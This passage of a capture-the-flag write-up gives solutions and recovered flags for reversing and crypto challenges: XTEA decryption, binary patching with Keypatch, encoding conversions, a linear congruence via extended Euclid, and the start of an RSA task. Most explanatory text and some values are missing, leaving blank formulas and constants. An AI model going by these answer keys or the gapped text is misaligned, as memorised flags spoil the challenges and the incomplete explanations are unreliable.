class="number">2</span>] = <span class="number">-181949973</span>;</span><br><span class="line">  v5[<span class="number">3</span>] = <span class="number">-483739382</span>;</span><br><span class="line">  v5[<span class="number">4</span>] = <span class="number">1062983671</span>;</span><br><span class="line">  v5[<span class="number">5</span>] = <span class="number">-697079924</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;input the flag: \n&quot;</span>);</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, Str);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strlen</span>((<span class="type">const</span> <span class="type">char</span> *)Str) == <span class="number">24</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">4</span>; ++i )</span><br><span class="line">      encrypt(&amp;Str[i], v6);</span><br><span class="line">    <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt;= <span class="number">5</span>; ++j )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( Str[j] != v5[j] )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;it&#x27;s not my teapot!&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Oh my god, you made it?!&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;the length is NSFW~~~&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>XTEA</code><a href="https://bbs.kanxue.com/thread-266933.htm">https://bbs.kanxue.com/thread-266933.htm</a><br />24<code>flag</code></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstdint&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">decrypt</span><span class="params">(<span class="type">int32_t</span>* v, <span class="type">uint32_t</span>* key)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">uint32_t</span> v0 = v[<span class="number">0</span>], v1 = v[<span class="number">1</span>];</span><br><span class="line"><span class="type">uint32_t</span> delta = <span class="number">289739793</span>;</span><br><span class="line"><span class="type">uint32_t</span> sum = delta &lt;&lt; <span class="number">5</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">v1 -= (((v0 &lt;&lt; <span class="number">4</span>) ^ (v0 &gt;&gt; <span class="number">5</span>)) + v0) ^ (sum + key[(sum &gt;&gt; <span class="number">11</span>) &amp; <span class="number">3</span>]);</span><br><span class="line">sum -= delta;</span><br><span class="line">v0 -= (((v1 &lt;&lt; <span class="number">4</span>) ^ (v1 &gt;&gt; <span class="number">5</span>)) + v1) ^ (sum + key[sum &amp; <span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">v[<span class="number">0</span>] = v0;</span><br><span class="line">v[<span class="number">1</span>] = v1;</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">uint32_t</span> key[<span class="number">4</span>];</span><br><span class="line">key[<span class="number">0</span>] = <span class="number">429459223</span>;</span><br><span class="line">key[<span class="number">1</span>] = <span class="number">537200643</span>;</span><br><span class="line">key[<span class="number">2</span>] = <span class="number">537462290</span>;</span><br><span class="line">key[<span class="number">3</span>] = <span class="number">537006083</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int32_t</span> enc[<span class="number">12</span>];</span><br><span class="line">enc[<span class="number">0</span>] = <span class="number">-999025570</span>;</span><br><span class="line">enc[<span class="number">1</span>] = <span class="number">970203505</span>;</span><br><span class="line">enc[<span class="number">2</span>] = <span class="number">-181949973</span>;</span><br><span class="line">enc[<span class="number">3</span>] = <span class="number">-483739382</span>;</span><br><span class="line">enc[<span class="number">4</span>] = <span class="number">1062983671</span>;</span><br><span class="line">enc[<span class="number">5</span>] = <span class="number">-697079924</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">4</span>; i &gt;= <span class="number">0</span>; i--)</span><br><span class="line">decrypt(&amp;enc[i], key);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt;= <span class="number">5</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, enc[i] &amp; <span class="number">0xFF</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, (enc[i] &amp; <span class="number">0xFF00</span>) &gt;&gt; <span class="number">8</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, (enc[i] &amp; <span class="number">0xFF0000</span>) &gt;&gt; <span class="number">16</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, (enc[i] &amp; <span class="number">0xFF000000</span>) &gt;&gt; <span class="number">24</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">putchar</span>(<span class="string">&#x27;\\n&#x27;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>cnss&#123;Enj0y_te4_W!th_me!&#125;</code><br /><code>XTEA</code></p><h2 id="-"><a class="markdownIt-Anchor" href="#-"></a>  </h2><p><code>ida</code><code>keypatch</code><code>patch</code><br /><a href="https://github.com/keystone-engine/keypatch">https://github.com/keystone-engine/keypatch</a><br /><code>Keypatch.py</code><code>IDA 7.0\plugins\Keypatch.py</code><br /><code>keystone python</code>64<br /><a href="https://github.com/keystone-engine/keystone/releases/download/0.9.1/keystone-0.9.1-python-win64.msi">https://github.com/keystone-engine/keystone/releases/download/0.9.1/keystone-0.9.1-python-win64.msi</a><br />(IDAEditPatch)()</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pip install keystone-engine <span class="comment"># </span></span><br><span class="line">pip install keystone-engine --upgrade <span class="comment"># </span></span><br></pre></td></tr></table></figure><p><img src="https://pic1.zhimg.com/80/v2-d6b21a295490beaebf6b0b22aca2c94b_1440w.png" alt="" /><br /><code>01h</code>0<code>patch</code>()<br /><code>Patch program</code>&gt;<code>apply patches to input file</code><br />(bushi)<br /><code>patch</code>()</p><p><code>cnss&#123;w0w_y0u_4r3_7he_m4st3r_0f_h1tt1ng_p1an3s!&#125;</code><br /><code>patch </code></p><h1 id="crypto"><a class="markdownIt-Anchor" href="#crypto"></a> Crypto</h1><h2 id="cnss"><a class="markdownIt-Anchor" href="#cnss"></a>  cnss</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">import base64</span></span><br><span class="line"><span class="string"># secret is a local file, flag is unknown to you. Try to find it.</span></span><br><span class="line"><span class="string">from secret import flag</span></span><br><span class="line"><span class="string">assert type(flag) == str</span></span><br><span class="line"><span class="string">flag = flag.encode()</span></span><br><span class="line"><span class="string">length = len(flag)</span></span><br><span class="line"><span class="string">assert length % 4 == 0</span></span><br><span class="line"><span class="string">L = length // 4</span></span><br><span class="line"><span class="string">secret1 = bytes_to_long(flag[:L])</span></span><br><span class="line"><span class="string">secret2 = flag[L:2*L].hex()</span></span><br><span class="line"><span class="string">secret3 = bin(int(flag[2*L:3*L].hex(), 16))</span></span><br><span class="line"><span class="string">secret4 = base64.b64encode(flag[3*L:])</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">secret1 = 30772543014919602267414633191</span></span><br><span class="line"><span class="string">secret2 = &#x27;bc96e7a081e698afe5ada620&#x27;</span></span><br><span class="line"><span class="string">secret3 = &#x27;0b10000110111001001111001011100000111010001101111001000001110011110011010100001001110011110101100&#x27;</span></span><br><span class="line"><span class="string">secret4 = b&#x27;rOS4gOatpeOAgiF9&#x27;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">secret1 = <span class="number">30772543014919602267414633191</span></span><br><span class="line">secret2 = <span class="string">&#x27;bc96e7a081e698afe5ada620&#x27;</span></span><br><span class="line">secret3 = <span class="string">&#x27;0b10000110111001001111001011100000111010001101111001000001110011110011010100001001110011110101100&#x27;</span></span><br><span class="line">secret4 = <span class="string">b&#x27;rOS4gOatpeOAgiF9&#x27;</span></span><br><span class="line">flag1 = long_to_bytes(secret1)</span><br><span class="line">flag2 = long_to_bytes(<span class="built_in">int</span>(secret2, <span class="number">16</span>))</span><br><span class="line">flag3 = long_to_bytes(<span class="built_in">int</span>(secret3[<span class="number">2</span>:], <span class="number">2</span>))</span><br><span class="line">flag4 = base64.b64decode(secret4)</span><br><span class="line"><span class="built_in">print</span>((flag1+flag2+flag3+flag4).decode())</span><br></pre></td></tr></table></figure><p><code>cnss&#123; Crypto !&#125;</code><br /><code></code></p><h2 id=""><a class="markdownIt-Anchor" href="#"></a>  </h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">from Crypto.Util.number import *</span></span><br><span class="line"><span class="string">from secret import flag</span></span><br><span class="line"><span class="string">m = bytes_to_long(flag)</span></span><br><span class="line"><span class="string">p = 4873905926740615531018463661385452170898784133203367799135441645830937750628221985822405430005703937197770247575076559744236744538228018031486049820173674</span></span><br><span class="line"><span class="string">g = 2593552830271406523114019117101950399687742243315195843514987700785182656087120211241524521448500935829478648514527037446437576680778419567396094750508622</span></span><br><span class="line"><span class="string">c = 0</span></span><br><span class="line"><span class="string">for i in range(m):</span></span><br><span class="line"><span class="string">    c = (c + g) % p</span></span><br><span class="line"><span class="string">print(f&#x27;&#123;c = &#125;&#x27;)</span></span><br><span class="line"><span class="string">c = 3431276814099066030808269572939347769420622699894452016972504433264414095698239241816562301198442206498226641308404105790355301176892588988847042699636406</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exgcd</span>(<span class="params">a, b</span>):</span><br><span class="line">    <span class="keyword">if</span> b == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>, <span class="number">0</span>, a</span><br><span class="line">    x, y, q = exgcd(b, a % b)</span><br><span class="line">    x, y = y, (x - a // b * y)</span><br><span class="line">    <span class="keyword">return</span> x, y, q</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">LiEu</span>(<span class="params">a, b, m</span>):</span><br><span class="line">    <span class="comment"># ax = b % m</span></span><br><span class="line">    x, y, q = exgcd(a, m)</span><br><span class="line">    <span class="keyword">if</span> b % q == <span class="number">0</span>:</span><br><span class="line">        m = m//q</span><br><span class="line">        <span class="keyword">return</span> ((x*b//q + m) % m)</span><br><span class="line">p = </span><br><span class="line">g = </span><br><span class="line">c = </span><br><span class="line">flag = LiEu(g, c, p)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(flag))</span><br></pre></td></tr></table></figure><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>a</mi><mi>x</mi><mo></mo><mi>b</mi><mtext></mtext><mo stretchy="false">(</mo><mi>m</mi><mi>o</mi><mi>d</mi><mtext></mtext><mi>m</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">ax\equiv b\ (mod\ m)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.46375em;vertical-align:0em;"></span><span class="mord mathnormal">a</span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel"></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">b</span><span class="mspace"></span><span class="mopen">(</span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mspace"></span><span class="mord mathnormal">m</span><span class="mclose">)</span></span></span></span><br /><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mtext></mtext><mi>a</mi><mi>x</mi><mo>+</mo><mi>m</mi><mi>y</mi><mo>=</mo><mi>b</mi></mrow><annotation encoding="application/x-tex">ax+my=b</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.76666em;vertical-align:-0.08333em;"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord mathnormal">a</span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord mathnormal">m</span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathnormal">b</span></span></span></span><br /><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>a</mi><msup><mi>x</mi><mo mathvariant="normal" lspace="0em" rspace="0em"></mo></msup><mo>+</mo><mi>m</mi><msup><mi>y</mi><mo mathvariant="normal" lspace="0em" rspace="0em"></mo></msup><mo>=</mo><mi>g</mi><mi>c</mi><mi>d</mi><mo stretchy="false">(</mo><mi>a</mi><mo separator="true">,</mo><mi>m</mi><mo stretchy="false">)</mo><mo>=</mo><mi>d</mi></mrow><annotation encoding="application/x-tex">ax&#x27;+my&#x27;=gcd(a,m)=d</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.835222em;vertical-align:-0.08333em;"></span><span class="mord mathnormal">a</span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.751892em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"></span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.946332em;vertical-align:-0.19444em;"></span><span class="mord mathnormal">m</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.751892em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"></span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mord mathnormal">c</span><span class="mord mathnormal">d</span><span class="mopen">(</span><span class="mord mathnormal">a</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">m</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathnormal">d</span></span></span></span><br /><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>a</mi><mi mathvariant="normal">/</mi><mi>d</mi><mtext></mtext><mi>m</mi><mi mathvariant="normal">/</mi><mi>d</mi><mtext></mtext><mi>d</mi><mi mathvariant="normal"></mi><mi>b</mi></mrow><annotation encoding="application/x-tex">a/dm/dd|b</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">a</span><span class="mord">/</span><span class="mord mathnormal">d</span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord mathnormal">m</span><span class="mord">/</span><span class="mord mathnormal">d</span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord mathnormal">d</span><span class="mord"></span><span class="mord mathnormal">b</span></span></span></span><br /><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">(</mo><mi>a</mi><mi mathvariant="normal">/</mi><mi>d</mi><mo stretchy="false">)</mo><mo></mo><mi>x</mi><mo>+</mo><mo stretchy="false">(</mo><mi>m</mi><mi mathvariant="normal">/</mi><mi>d</mi><mo stretchy="false">)</mo><mo></mo><mi>y</mi><mo>=</mo><mi>b</mi><mi mathvariant="normal">/</mi><mi>d</mi><mtext></mtext><mi>y</mi><mtext></mtext><mi>x</mi><mtext></mtext><mi>d</mi><mtext></mtext><mi>d</mi><mtext></mtext><mi>m</mi><mi mathvariant="normal">/</mi><mi>d</mi><mtext></mtext></mrow><annotation encoding="application/x-tex">(a/d)*x+(m/d)*y=b/dyxddm/d</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal">a</span><span class="mord">/</span><span class="mord mathnormal">d</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin"></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.66666em;vertical-align:-0.08333em;"></span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal">m</span><span class="mord">/</span><span class="mord mathnormal">d</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin"></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">b</span><span class="mord">/</span><span class="mord mathnormal">d</span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord mathnormal">x</span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord mathnormal">d</span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord mathnormal">d</span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord mathnormal">m</span><span class="mord">/</span><span class="mord mathnormal">d</span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span></span></span></span><br /><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>a</mi><msup><mi>x</mi><mo mathvariant="normal" lspace="0em" rspace="0em"></mo></msup><mo></mo><mo stretchy="false">(</mo><mi>b</mi><mi mathvariant="normal">/</mi><mi>d</mi><mo stretchy="false">)</mo><mo>+</mo><mi>m</mi><msup><mi>y</mi><mo mathvariant="normal" lspace="0em" rspace="0em"></mo></msup><mo></mo><mo stretchy="false">(</mo><mi>b</mi><mi mathvariant="normal">/</mi><mi>d</mi><mo stretchy="false">)</mo><mo>=</mo><mi>d</mi><mo></mo><mo stretchy="false">(</mo><mi>b</mi><mi mathvariant="normal">/</mi><mi>d</mi><mo stretchy="false">)</mo><mo>=</mo><mi>b</mi></mrow><annotation encoding="application/x-tex">ax&#x27;*(b/d)+my&#x27;*(b/d)=d*(b/d)=b</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.751892em;vertical-align:0em;"></span><span class="mord mathnormal">a</span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.751892em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"></span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin"></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal">b</span><span class="mord">/</span><span class="mord mathnormal">d</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.946332em;vertical-align:-0.19444em;"></span><span class="mord mathnormal">m</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.751892em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"></span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin"></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal">b</span><span class="mord">/</span><span class="mord mathnormal">d</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathnormal">d</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin"></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal">b</span><span class="mord">/</span><span class="mord mathnormal">d</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathnormal">b</span></span></span></span><br /><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mtext></mtext><msup><mi>x</mi><mo mathvariant="normal" lspace="0em" rspace="0em"></mo></msup><mo></mo><mo stretchy="false">(</mo><mi>b</mi><mi mathvariant="normal">/</mi><mi>d</mi><mo stretchy="false">)</mo><mtext></mtext></mrow><annotation encoding="application/x-tex">x&#x27;*(b/d)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.751892em;vertical-align:0em;"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.751892em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"></span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin"></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal">b</span><span class="mord">/</span><span class="mord mathnormal">d</span><span class="mclose">)</span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span></span></span></span><br /><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mtext></mtext><mo stretchy="false">(</mo><mtext></mtext><mi>m</mi><mo>=</mo><mi>m</mi><mi mathvariant="normal">/</mi><mi>d</mi><mo stretchy="false">)</mo><mtext></mtext><mo stretchy="false">(</mo><mi>x</mi><mo></mo><mo stretchy="false">(</mo><mi>b</mi><mi mathvariant="normal">/</mi><mi>d</mi><mo stretchy="false">)</mo><mo>+</mo><mi>m</mi><mo stretchy="false">)</mo><mi mathvariant="normal">%</mi><mi>m</mi></mrow><annotation encoding="application/x-tex">(m=m/d)(x*(b/d)+m)\%m</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mopen">(</span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord mathnormal">m</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">m</span><span class="mord">/</span><span class="mord mathnormal">d</span><span class="mclose">)</span><span class="mord cjk_fallback"></span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin"></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal">b</span><span class="mord">/</span><span class="mord mathnormal">d</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">m</span><span class="mclose">)</span><span class="mord">%</span><span class="mord mathnormal">m</span></span></span></span></p><p><code>cnss&#123;Subgroup @nd Eucl1d algOrithm 1s eleg4nt.&#125;</code><br /><code></code></p><h2 id=""><a class="markdownIt-Anchor" href="#"></a>  </h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">from Crypto.Util.number import *</span></span><br><span class="line"><span class="string">from secret import flag</span></span><br><span class="line"><span class="string">p, q, r = getPrime(512), getPrime(512), getPrime(512)</span></span><br><span class="line"><span class="string">n = p * q * r</span></span><br><span class="line"><span class="string">e = 65537</span></span><br><span class="line"><span class="string">m = bytes_to_long(flag)</span></span><br><span class="line"><span class="string">c = pow(m, e, n)</span></span><br><span class="line"><span class="string">print(&#x27;p =&#x27;, p)</span></span><br><span class="line"><span class="string">print(&#x27;q =&#x27;, q)</span></span><br><span class="line"><span class="string">print(&#x27;n =&#x27;, n)</span></span><br><span class="line"><span class="string">print(&#x27;c =&#x27;, c)</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">p = 